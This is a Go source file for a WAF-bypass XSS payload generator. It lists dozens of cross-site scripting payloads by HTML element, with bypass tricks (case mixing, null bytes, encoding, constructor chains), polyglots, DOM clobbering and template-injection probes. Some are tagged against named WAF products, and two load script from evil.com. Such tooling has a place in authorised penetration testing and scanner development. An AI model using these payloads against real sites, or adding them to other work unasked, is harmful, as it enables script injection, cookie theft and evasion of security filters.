// Package waf provides WAF detection and bypass capabilities
package waf

// ElementType represents an HTML element type for payload generation
type ElementType string

const (
	ElementScript ElementType = "script"
	ElementImg    ElementType = "img"
	ElementDiv    ElementType = "div"
	ElementSpan   ElementType = "span"
	ElementSVG    ElementType = "svg"
	ElementIframe ElementType = "iframe"
	ElementObject ElementType = "object"
	ElementEmbed  ElementType = "embed"
	ElementInput  ElementType = "input"
	ElementBody   ElementType = "body"
	ElementA      ElementType = "a"
	ElementForm   ElementType = "form"
)

// PayloadCategory represents a category of payloads
type PayloadCategory string

const (
	CategoryBasic          PayloadCategory = "basic"
	CategoryWAFBypass      PayloadCategory = "waf_bypass"
	CategoryCSPBypass      PayloadCategory = "csp_bypass"
	CategoryEventHandler   PayloadCategory = "event_handler"
	CategoryProtocol       PayloadCategory = "protocol"
	CategoryEncoded        PayloadCategory = "encoded"
	CategoryPolyglot       PayloadCategory = "polyglot"
	CategoryDOMClobbering  PayloadCategory = "dom_clobbering"
	CategoryFilterBypass   PayloadCategory = "filter_bypass"
	CategoryTemplateInject PayloadCategory = "template_injection"
)

// Payload represents a single XSS test payload
type Payload struct {
	Value       string          `json:"value"`
	Element     ElementType     `json:"element"`
	Category    PayloadCategory `json:"category"`
	Description string          `json:"description"`
	Confidence  int             `json:"confidence"` // 0-100 likelihood of success
	WAFTargets  []WAFType       `json:"waf_targets,omitempty"`
}

// PayloadGenerator generates context-aware XSS payloads
type PayloadGenerator struct {
	encoder *Encoder
}

// NewPayloadGenerator creates a new payload generator
func NewPayloadGenerator() *PayloadGenerator {
	return &PayloadGenerator{
		encoder: NewEncoder(),
	}
}

// Generate returns payloads for given element types, optionally filtered by WAF
func (p *PayloadGenerator) Generate(wafType WAFType, elements ...ElementType) []Payload {
	var payloads []Payload

	for _, element := range elements {
		switch element {
		case ElementScript:
			payloads = append(payloads, p.getScriptPayloads()...)
		case ElementImg:
			payloads = append(payloads, p.getImgPayloads()...)
		case ElementDiv:
			payloads = append(payloads, p.getDivPayloads()...)
		case ElementSpan:
			payloads = append(payloads, p.getSpanPayloads()...)
		case ElementSVG:
			payloads = append(payloads, p.getSVGPayloads()...)
		case ElementIframe:
			payloads = append(payloads, p.getIframePayloads()...)
		case ElementInput:
			payloads = append(payloads, p.getInputPayloads()...)
		case ElementBody:
			payloads = append(payloads, p.getBodyPayloads()...)
		case ElementA:
			payloads = append(payloads, p.getAnchorPayloads()...)
		case ElementForm:
			payloads = append(payloads, p.getFormPayloads()...)
		}
	}

	// Filter by WAF if specified
	if wafType != WAFUnknown {
		payloads = p.filterByWAF(payloads, wafType)
	}

	return payloads
}

// GenerateAll returns all payloads for all element types
func (p *PayloadGenerator) GenerateAll() []Payload {
	return p.Generate(WAFUnknown,
		ElementScript, ElementImg, ElementDiv, ElementSpan,
		ElementSVG, ElementIframe, ElementInput, ElementBody,
		ElementA, ElementForm,
	)
}

// filterByWAF prioritizes payloads that work better against specific WAFs
func (p *PayloadGenerator) filterByWAF(payloads []Payload, wafType WAFType) []Payload {
	// Sort payloads to prioritize WAF-specific ones
	var prioritized, general []Payload

	for _, payload := range payloads {
		if len(payload.WAFTargets) == 0 {
			general = append(general, payload)
			continue
		}

		for _, target := range payload.WAFTargets {
			if target == wafType {
				prioritized = append(prioritized, payload)
				break
			}
		}
	}

	return append(prioritized, general...)
}

// Script tag payloads (25+ variants)
func (p *PayloadGenerator) getScriptPayloads() []Payload {
	return []Payload{
		// Basic payloads
		{Value: "<script>alert(1)</script>", Element: ElementScript, Category: CategoryBasic, Description: "Basic script alert", Confidence: 30},
		{Value: "<script>alert(document.domain)</script>", Element: ElementScript, Category: CategoryBasic, Description: "Domain disclosure", Confidence: 30},
		{Value: "<script>alert(document.cookie)</script>", Element: ElementScript, Category: CategoryBasic, Description: "Cookie disclosure", Confidence: 30},

		// Case variation
		{Value: "<ScRiPt>alert(1)</ScRiPt>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Mixed case bypass", Confidence: 50, WAFTargets: []WAFType{WAFModSecurity, WAFNginx}},
		{Value: "<SCRIPT>alert(1)</SCRIPT>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Uppercase bypass", Confidence: 50},

		// Whitespace injection
		{Value: "<script >alert(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Space after tag", Confidence: 55},
		{Value: "<script\t>alert(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Tab whitespace", Confidence: 60, WAFTargets: []WAFType{WAFCloudflare, WAFAkamai}},
		{Value: "<script\n>alert(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Newline whitespace", Confidence: 60},
		{Value: "<script\r>alert(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "CR whitespace", Confidence: 60},

		// Comment insertion
		{Value: "<script>/**/alert(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Empty comment", Confidence: 55},
		{Value: "<script>alert/*comment*/(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Comment in function", Confidence: 60, WAFTargets: []WAFType{WAFModSecurity}},
		{Value: "<script>a]lert(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Special char insertion", Confidence: 40},

		// Tag breaking
		{Value: "</script><script>alert(1)</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Close and reopen", Confidence: 65},
		{Value: "<script>alert(1)</script//>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Double slash close", Confidence: 50},
		{Value: "<script>alert(1)</script >", Element: ElementScript, Category: CategoryWAFBypass, Description: "Space before close", Confidence: 45},

		// Null byte injection
		{Value: "<scr\x00ipt>alert(1)</scr\x00ipt>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Null byte in tag", Confidence: 65, WAFTargets: []WAFType{WAFModSecurity, WAFNginx, WAFWordfence}},

		// SVG wrapper
		{Value: "<svg><script>alert(1)</script></svg>", Element: ElementScript, Category: CategoryWAFBypass, Description: "SVG wrapped script", Confidence: 70, WAFTargets: []WAFType{WAFCloudflare, WAFAkamai}},

		// Protocol handlers
		{Value: "<script src=//evil.com/x.js></script>", Element: ElementScript, Category: CategoryProtocol, Description: "Protocol-relative src", Confidence: 45},
		{Value: `<script src="data:,alert(1)"></script>`, Element: ElementScript, Category: CategoryProtocol, Description: "Data URI src", Confidence: 60},

		// Template literals
		{Value: "<script>alert`1`</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Template literal", Confidence: 70, WAFTargets: []WAFType{WAFAkamai, WAFCloudflare, WAFImperva}},
		{Value: "<script>alert`document.domain`</script>", Element: ElementScript, Category: CategoryWAFBypass, Description: "Template literal domain", Confidence: 70},

		// Constructor chain
		{Value: `<script>[].constructor.constructor("alert(1)")()</script>`, Element: ElementScript, Category: CategoryWAFBypass, Description: "Constructor chain", Confidence: 75, WAFTargets: []WAFType{WAFCloudflare, WAFAkamai, WAFImperva}},
		{Value: `<script>window["al"+"ert"](1)</script>`, Element: ElementScript, Category: CategoryWAFBypass, Description: "String concatenation", Confidence: 60},

		// CSP bypass techniques
		{Value: `<script src="/api?callback=alert"></script>`, Element: ElementScript, Category: CategoryCSPBypass, Description: "JSONP callback", Confidence: 50},
		{Value: `<base href="//evil.com/"><script src="/safe.js"></script>`, Element: ElementScript, Category: CategoryCSPBypass, Description: "Base tag hijack", Confidence: 55},

		// Encoded variants
		{Value: "<script>eval(atob('YWxlcnQoMSk='))</script>", Element: ElementScript, Category: CategoryEncoded, Description: "Base64 encoded", Confidence: 65},
		{Value: "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", Element: ElementScript, Category: CategoryEncoded, Description: "CharCode encoded", Confidence: 70, WAFTargets: []WAFType{WAFCloudflare, WAFAkamai}},
	}
}

// IMG tag payloads (25+ variants)
func (p *PayloadGenerator) getImgPayloads() []Payload {
	return []Payload{
		// Basic
		{Value: "<img src=x onerror=alert(1)>", Element: ElementImg, Category: CategoryBasic, Description: "Basic img onerror", Confidence: 35},
		{Value: `<img src=x onerror="alert(1)">`, Element: ElementImg, Category: CategoryBasic, Description: "Quoted onerror", Confidence: 35},
		{Value: "<img/src=x onerror=alert(1)>", Element: ElementImg, Category: CategoryBasic, Description: "Slash separator", Confidence: 40},

		// Slash tricks
		{Value: "<img/src/onerror=alert(1)>", Element: ElementImg, Category: CategoryWAFBypass, Description: "Double slash trick", Confidence: 60, WAFTargets: []WAFType{WAFModSecurity, WAFNginx}},
		{Value: "<img src=x\tonerror=alert(1)>", Element: ElementImg, Category: CategoryWAFBypass, Description: "Tab separator", Confidence: 65},

		// Backtick call
		{Value: "<img src=x onerror=alert`1`>", Element: ElementImg, Category: CategoryWAFBypass, Description: "Backtick alert", Confidence: 70, WAFTargets: []WAFType{WAFCloudflare, WAFAkamai, WAFImperva}},

		// HTML entity encoding
		{Value: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", Element: ElementImg, Category: CategoryEncoded, Description: "Decimal entities", Confidence: 70, WAFTargets: []WAFType{WAFAkamai, WAFCloudflare}},
		{Value: "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>", Element: ElementImg, Category: CategoryEncoded, Description: "Hex entities", Confidence: 70},

		// Unicode escaping
		{Value: "<img src=x onerror=\\u0061lert(1)>", Element: ElementImg, Category: CategoryEncoded, Description: "Unicode escape", Confidence: 65},

		// Mixed quotes
		{Value: `<img src='x' onerror="alert(1)">`, Element: ElementImg, Category: CategoryWAFBypass, Description: "Mixed quotes", Confidence: 50},
		{Value: "<img src=x onerror=alert(1)//>", Element: ElementImg, Category: CategoryWAFBypass, Description: "Comment close", Confidence: 55},

		// SVG image
		{Value: "<svg><image xlink:href=x onerror=alert(1)>", Element: ElementImg, Category: CategoryWAFBypass, Description: "SVG image tag", Confidence: 70, WAFTargets: []WAFType{WAFCloudflare}},

		// Data URL
		{Value: `<img src="data:x,x" onerror=alert(1)>`, Element: ElementImg, Category: CategoryProtocol, Description: "Data URL error", Confidence: 55},

		// Loading attribute
		{Value: "<img loading=lazy src=x onerror=alert(1)>", Element: ElementImg, Category: CategoryWAFBypass, Description: "Lazy loading", Confidence: 50},

		// Legacy IE
		{Value: "<img dynsrc=javascript:alert(1)>", Element: ElementImg, Category: CategoryProtocol, Description: "Dynsrc IE", Confidence: 25},
		{Value: "<img lowsrc=javascript:alert(1)>", Element: ElementImg, Category: CategoryProtocol, Description: "Lowsrc IE", Confidence: 25},

		// Other events
		{Value: "<img src=valid.jpg onload=alert(1)>", Element: ElementImg, Category: CategoryEventHandler, Description: "Onload event", Confidence: 40},

		// Filter evasion
		{Value: "<<img src=x onerror=alert(1)>", Element: ElementImg, Category: CategoryFilterBypass, Description: "Double bracket", Confidence: 55},
		{Value: `<img/src="x"/onerror="alert(1)">`, Element: ElementImg, Category: CategoryFilterBypass, Description: "Slash quoted", Confidence: 50},

		// Constructor bypass
		{Value: "<img src=x onerror=window.onerror=alert;throw+1>", Element: ElementImg, Category: CategoryWAFBypass, Description: "Window onerror", Confidence: 65},
		{Value: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", Element: ElementImg, Category: CategoryEncoded, Description: "Base64 in onerror", Confidence: 70},

		// Long encoding
		{Value: "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", Element: ElementImg, Category: CategoryEncoded, Description: "CharCode onerror", Confidence: 75},

		// With animation
		{Value: `<img src=x style="animation:x" onanimationend=alert(1)>`, Element: ElementImg, Category: CategoryEventHandler, Description: "Animation event", Confidence: 60},

		// Focus-based
		{Value: "<img src=x id=x tabindex=1 onfocus=alert(1)>", Element: ElementImg, Category: CategoryEventHandler, Description: "Focus event", Confidence: 45},
	}
}

// DIV tag payloads (25+ variants)
func (p *PayloadGenerator) getDivPayloads() []Payload {
	return []Payload{
		// Basic
		{Value: "<div onmouseover=alert(1)>XSS</div>", Element: ElementDiv, Category: CategoryBasic, Description: "Mouseover", Confidence: 30},
		{Value: "<div onclick=alert(1)>Click</div>", Element: ElementDiv, Category: CategoryBasic, Description: "Click handler", Confidence: 30},

		// Contenteditable
		{Value: "<div contenteditable onblur=alert(1)>Click out</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Contenteditable blur", Confidence: 55},
		{Value: "<div contenteditable onfocus=alert(1)>Focus me</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Contenteditable focus", Confidence: 55},
		{Value: "<div contenteditable oninput=alert(1)>Type here</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Contenteditable input", Confidence: 55},

		// Auto-trigger
		{Value: "<div id=x tabindex=1 onfocus=alert(1)></div><a href=#x>Click</a>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Tab focus trigger", Confidence: 60},
		{Value: "<div onpointermove=alert(1)>Move mouse</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Pointer move", Confidence: 50},
		{Value: "<div ontouchstart=alert(1)>Touch</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Touch start", Confidence: 45},

		// Scroll events
		{Value: `<div style="height:50px;overflow:scroll" onscroll=alert(1)><div style="height:100px">Scroll</div></div>`, Element: ElementDiv, Category: CategoryEventHandler, Description: "Scroll trigger", Confidence: 55},

		// Animation events
		{Value: `<div style="animation:x" onanimationend=alert(1)><style>@keyframes x{}</style></div>`, Element: ElementDiv, Category: CategoryEventHandler, Description: "Animation end", Confidence: 60},
		{Value: `<div style="transition:all 0.001s" ontransitionend=alert(1)>Trans</div>`, Element: ElementDiv, Category: CategoryEventHandler, Description: "Transition end", Confidence: 60},

		// Drag events
		{Value: "<div draggable=true ondragstart=alert(1)>Drag</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Drag start", Confidence: 50},
		{Value: `<div ondrop=alert(1) ondragover="return false">Drop zone</div>`, Element: ElementDiv, Category: CategoryEventHandler, Description: "Drop handler", Confidence: 50},

		// Wheel event
		{Value: `<div onwheel=alert(1) style="height:100px;overflow:auto"><div style="height:200px"></div></div>`, Element: ElementDiv, Category: CategoryEventHandler, Description: "Wheel event", Confidence: 55},

		// CSS expression (IE)
		{Value: `<div style="width:expression(alert(1))">`, Element: ElementDiv, Category: CategoryProtocol, Description: "CSS expression", Confidence: 20},
		{Value: `<div style="behavior:url(#default#time2)" onbegin=alert(1)>`, Element: ElementDiv, Category: CategoryProtocol, Description: "Behavior IE", Confidence: 20},

		// Custom element
		{Value: "<x-div onclick=alert(1)>Click</x-div>", Element: ElementDiv, Category: CategoryWAFBypass, Description: "Custom element", Confidence: 65, WAFTargets: []WAFType{WAFCloudflare, WAFAkamai}},

		// Data attributes
		{Value: `<div data-x="y" onmouseover=alert(this.dataset.x)>`, Element: ElementDiv, Category: CategoryEventHandler, Description: "Dataset access", Confidence: 40},

		// Nested events
		{Value: "<div><span onclick=alert(1)>Nested</span></div>", Element: ElementDiv, Category: CategoryWAFBypass, Description: "Nested handler", Confidence: 45},

		// Role-based
		{Value: "<div role=button tabindex=0 onkeydown=alert(1)>Press key</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Role button", Confidence: 50},

		// Autofocus trick
		{Value: "<div tabindex=1 autofocus onfocus=alert(1)>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Autofocus div", Confidence: 55},

		// Context menu
		{Value: "<div oncontextmenu=alert(1)>Right click</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Context menu", Confidence: 45},

		// Selection
		{Value: "<div onselectstart=alert(1)>Select text</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Selection start", Confidence: 45},

		// Copy/paste
		{Value: "<div oncopy=alert(1)>Copy me</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Copy event", Confidence: 45},
		{Value: "<div contenteditable onpaste=alert(1)>Paste here</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Paste event", Confidence: 50},

		// Aux click
		{Value: "<div onauxclick=alert(1)>Middle click</div>", Element: ElementDiv, Category: CategoryEventHandler, Description: "Aux click", Confidence: 45},
	}
}

// SPAN tag payloads (25+ variants)
func (p *PayloadGenerator) getSpanPayloads() []Payload {
	return []Payload{
		// Basic
		{Value: "<span onmouseover=alert(1)>Hover</span>", Element: ElementSpan, Category: CategoryBasic, Description: "Mouseover", Confidence: 30},
		{Value: "<span onclick=alert(1)>Click</span>", Element: ElementSpan, Category: CategoryBasic, Description: "Click", Confidence: 30},

		// Focus events
		{Value: "<span tabindex=1 onfocus=alert(1)>Focus</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Tab focus", Confidence: 50},
		{Value: "<span tabindex=0 onblur=alert(1)>Blur</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Tab blur", Confidence: 50},

		// Contenteditable
		{Value: "<span contenteditable oninput=alert(1)>Edit me</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Input event", Confidence: 55},
		{Value: "<span contenteditable onpaste=alert(1)>Paste here</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Paste event", Confidence: 50},

		// Keyboard events
		{Value: "<span contenteditable onkeyup=alert(1)>Type</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Keyup event", Confidence: 50},
		{Value: "<span contenteditable onkeydown=alert(1)>Type</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Keydown event", Confidence: 50},
		{Value: "<span contenteditable onkeypress=alert(1)>Press</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Keypress event", Confidence: 50},

		// Pointer events
		{Value: "<span onpointerover=alert(1)>Hover</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Pointer over", Confidence: 50},
		{Value: "<span onpointerdown=alert(1)>Touch/Click</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Pointer down", Confidence: 50},
		{Value: "<span onpointerenter=alert(1)>Enter</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Pointer enter", Confidence: 50},
		{Value: "<span onpointerleave=alert(1)>Leave</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Pointer leave", Confidence: 50},

		// Copy/Cut events
		{Value: "<span oncopy=alert(1)>Copy me</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Copy event", Confidence: 45},
		{Value: "<span oncut=alert(1) contenteditable>Cut me</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Cut event", Confidence: 50},

		// Select events
		{Value: "<span onselectstart=alert(1)>Select text</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Select start", Confidence: 45},

		// Context menu
		{Value: "<span oncontextmenu=alert(1)>Right click</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Context menu", Confidence: 45},

		// Aux click
		{Value: "<span onauxclick=alert(1)>Middle click</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Aux click", Confidence: 45},

		// CSS tricks
		{Value: `<span style="-webkit-user-modify:read-write" onfocus=alert(1)>Focus</span>`, Element: ElementSpan, Category: CategoryWAFBypass, Description: "Webkit modify", Confidence: 55},

		// Role override
		{Value: "<span role=textbox tabindex=0 oninput=alert(1)>Input</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Role textbox", Confidence: 50},

		// Title with events
		{Value: "<span title=test onmouseover=alert(1)>Titled</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Titled span", Confidence: 35},

		// Drag events
		{Value: "<span draggable=true ondragstart=alert(1)>Drag</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Drag start", Confidence: 50},
		{Value: "<span ondragend=alert(1) draggable=true>Drag end</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Drag end", Confidence: 50},

		// Animation
		{Value: `<span style="animation:x" onanimationstart=alert(1)><style>@keyframes x{}</style></span>`, Element: ElementSpan, Category: CategoryEventHandler, Description: "Animation start", Confidence: 55},

		// Autofocus trick
		{Value: "<span tabindex=1 autofocus onfocus=alert(1)>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Autofocus span", Confidence: 55},

		// Touch events
		{Value: "<span ontouchstart=alert(1)>Touch</span>", Element: ElementSpan, Category: CategoryEventHandler, Description: "Touch start", Confidence: 45},
	}
}

// SVG payloads
func (p *PayloadGenerator) getSVGPayloads() []Payload {
	return []Payload{
		{Value: "<svg onload=alert(1)>", Element: ElementSVG, Category: CategoryBasic, Description: "SVG onload", Confidence: 40},
		{Value: "<svg/onload=alert(1)>", Element: ElementSVG, Category: CategoryWAFBypass, Description: "SVG slash onload", Confidence: 55},
		{Value: "<svg onload=alert`1`>", Element: ElementSVG, Category: CategoryWAFBypass, Description: "SVG backtick", Confidence: 70},
		{Value: `<svg><animate onbegin=alert(1) attributeName=x>`, Element: ElementSVG, Category: CategoryEventHandler, Description: "SVG animate", Confidence: 60},
		{Value: `<svg><set onbegin=alert(1) attributeName=x>`, Element: ElementSVG, Category: CategoryEventHandler, Description: "SVG set", Confidence: 60},
		{Value: "<svg><script>alert(1)</script>", Element: ElementSVG, Category: CategoryBasic, Description: "SVG script", Confidence: 50},
		{Value: `<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/></a>`, Element: ElementSVG, Category: CategoryProtocol, Description: "SVG xlink", Confidence: 55},
		{Value: `<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">`, Element: ElementSVG, Category: CategoryWAFBypass, Description: "SVG foreignObject", Confidence: 65},
	}
}

// Iframe payloads
func (p *PayloadGenerator) getIframePayloads() []Payload {
	return []Payload{
		{Value: `<iframe src="javascript:alert(1)">`, Element: ElementIframe, Category: CategoryProtocol, Description: "Iframe javascript src", Confidence: 40},
		{Value: `<iframe srcdoc="<script>alert(1)</script>">`, Element: ElementIframe, Category: CategoryBasic, Description: "Iframe srcdoc", Confidence: 55},
		{Value: `<iframe src="data:text/html,<script>alert(1)</script>">`, Element: ElementIframe, Category: CategoryProtocol, Description: "Iframe data URL", Confidence: 50},
		{Value: `<iframe onload=alert(1) src=x>`, Element: ElementIframe, Category: CategoryEventHandler, Description: "Iframe onload", Confidence: 45},
		{Value: `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`, Element: ElementIframe, Category: CategoryEncoded, Description: "Iframe encoded srcdoc", Confidence: 60},
	}
}

// Input payloads
func (p *PayloadGenerator) getInputPayloads() []Payload {
	return []Payload{
		{Value: "<input onfocus=alert(1) autofocus>", Element: ElementInput, Category: CategoryEventHandler, Description: "Input autofocus", Confidence: 60},
		{Value: "<input onblur=alert(1) autofocus><input autofocus>", Element: ElementInput, Category: CategoryEventHandler, Description: "Input blur trick", Confidence: 55},
		{Value: `<input type=image src=x onerror=alert(1)>`, Element: ElementInput, Category: CategoryEventHandler, Description: "Input image error", Confidence: 50},
		{Value: "<input onfocus=alert(1) autofocus/x>", Element: ElementInput, Category: CategoryWAFBypass, Description: "Input slash bypass", Confidence: 60},
		{Value: "<input onkeydown=alert(1) autofocus>", Element: ElementInput, Category: CategoryEventHandler, Description: "Input keydown", Confidence: 45},
	}
}

// Body payloads
func (p *PayloadGenerator) getBodyPayloads() []Payload {
	return []Payload{
		{Value: "<body onload=alert(1)>", Element: ElementBody, Category: CategoryEventHandler, Description: "Body onload", Confidence: 35},
		{Value: "<body onpageshow=alert(1)>", Element: ElementBody, Category: CategoryEventHandler, Description: "Body pageshow", Confidence: 40},
		{Value: "<body onhashchange=alert(1)>", Element: ElementBody, Category: CategoryEventHandler, Description: "Body hashchange", Confidence: 40},
		{Value: "<body onresize=alert(1)>", Element: ElementBody, Category: CategoryEventHandler, Description: "Body resize", Confidence: 35},
		{Value: "<body/onload=alert(1)>", Element: ElementBody, Category: CategoryWAFBypass, Description: "Body slash onload", Confidence: 55},
	}
}

// Anchor payloads
func (p *PayloadGenerator) getAnchorPayloads() []Payload {
	return []Payload{
		{Value: `<a href="javascript:alert(1)">Click</a>`, Element: ElementA, Category: CategoryProtocol, Description: "Anchor javascript", Confidence: 35},
		{Value: `<a href="javascript:void(0)" onclick=alert(1)>Click</a>`, Element: ElementA, Category: CategoryEventHandler, Description: "Anchor onclick", Confidence: 30},
		{Value: `<a href="javascript:alert(1)" onmouseover=alert(2)>Hover</a>`, Element: ElementA, Category: CategoryEventHandler, Description: "Anchor dual trigger", Confidence: 40},
		{Value: `<a href="#" onfocus=alert(1) tabindex=1>Tab</a>`, Element: ElementA, Category: CategoryEventHandler, Description: "Anchor focus", Confidence: 45},
	}
}

// Form payloads
func (p *PayloadGenerator) getFormPayloads() []Payload {
	return []Payload{
		{Value: `<form action="javascript:alert(1)"><input type=submit>`, Element: ElementForm, Category: CategoryProtocol, Description: "Form javascript action", Confidence: 40},
		{Value: `<form><button formaction="javascript:alert(1)">X</button>`, Element: ElementForm, Category: CategoryProtocol, Description: "Button formaction", Confidence: 50},
		{Value: `<form onsubmit=alert(1)><input type=submit>`, Element: ElementForm, Category: CategoryEventHandler, Description: "Form onsubmit", Confidence: 35},
		{Value: "<form id=x></form><button form=x formaction=javascript:alert(1)>X", Element: ElementForm, Category: CategoryProtocol, Description: "External form button", Confidence: 55},
	}
}

// GetPolyglotPayloads returns payloads that work in multiple contexts
func (p *PayloadGenerator) GetPolyglotPayloads() []Payload {
	return []Payload{
		{
			Value:       "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
			Category:    CategoryPolyglot,
			Description: "Ultimate polyglot",
			Confidence:  80,
		},
		{
			Value:       "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><svg/onload=alert()>",
			Category:    CategoryPolyglot,
			Description: "Context escape polyglot",
			Confidence:  75,
		},
		{
			Value:       "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
			Category:    CategoryPolyglot,
			Description: "JS context polyglot",
			Confidence:  70,
		},
		{
			Value:       "-->'\"--></style></script><script>alert(1)</script>",
			Category:    CategoryPolyglot,
			Description: "Comment escape polyglot",
			Confidence:  65,
		},
		{
			Value:       "'\"><img src=x onerror=alert(1)//>",
			Category:    CategoryPolyglot,
			Description: "Quote escape polyglot",
			Confidence:  60,
		},
	}
}

// GetDOMClobberingPayloads returns DOM clobbering attack payloads
func (p *PayloadGenerator) GetDOMClobberingPayloads() []Payload {
	return []Payload{
		{Value: "<form id=x><input name=y value=z>", Category: CategoryDOMClobbering, Description: "Form clobber", Confidence: 50},
		{Value: "<img name=x>", Category: CategoryDOMClobbering, Description: "Image clobber", Confidence: 40},
		{Value: "<a id=x href=y>", Category: CategoryDOMClobbering, Description: "Anchor clobber", Confidence: 45},
		{Value: "<form id=document><input name=cookie>", Category: CategoryDOMClobbering, Description: "Document cookie clobber", Confidence: 55},
		{Value: `<iframe name=x srcdoc="<a id=y href=z>">`, Category: CategoryDOMClobbering, Description: "Iframe clobber", Confidence: 50},
	}
}

// GetTemplateInjectionPayloads returns template injection payloads
func (p *PayloadGenerator) GetTemplateInjectionPayloads() []Payload {
	return []Payload{
		{Value: `{{constructor.constructor("alert(1)")()}}`, Category: CategoryTemplateInject, Description: "Angular/Vue constructor", Confidence: 65},
		{Value: `${alert(1)}`, Category: CategoryTemplateInject, Description: "Template literal", Confidence: 50},
		{Value: `{{7*7}}`, Category: CategoryTemplateInject, Description: "Template math test", Confidence: 30},
		{Value: `#{7*7}`, Category: CategoryTemplateInject, Description: "Ruby template test", Confidence: 30},
		{Value: `<%=7*7%>`, Category: CategoryTemplateInject, Description: "ERB template test", Confidence: 30},
		{Value: `{{config}}`, Category: CategoryTemplateInject, Description: "Config disclosure", Confidence: 35},
	}
}
